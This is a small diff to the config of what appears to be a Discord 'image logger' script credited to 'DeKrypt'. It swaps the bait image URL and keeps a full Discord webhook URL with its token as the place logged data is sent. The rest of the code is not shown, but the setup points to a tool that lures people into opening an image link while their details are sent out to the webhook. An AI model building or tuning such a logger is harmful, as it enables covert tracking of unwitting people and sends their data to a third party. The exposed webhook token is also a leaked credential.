@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1472957110311452807/94r3sXzQEXjT-u28Uhbr8fGh7uuZ-BlieEBSnmC71b760ZpwUUzzb57zgB8dDroStQnY",
-    "image": "https://www.pbs.org/wnet/nature/files/2014/10/Monkey-Main.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://static.tvtropes.org/pmwiki/pub/images/mikesulleyfaceswap.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
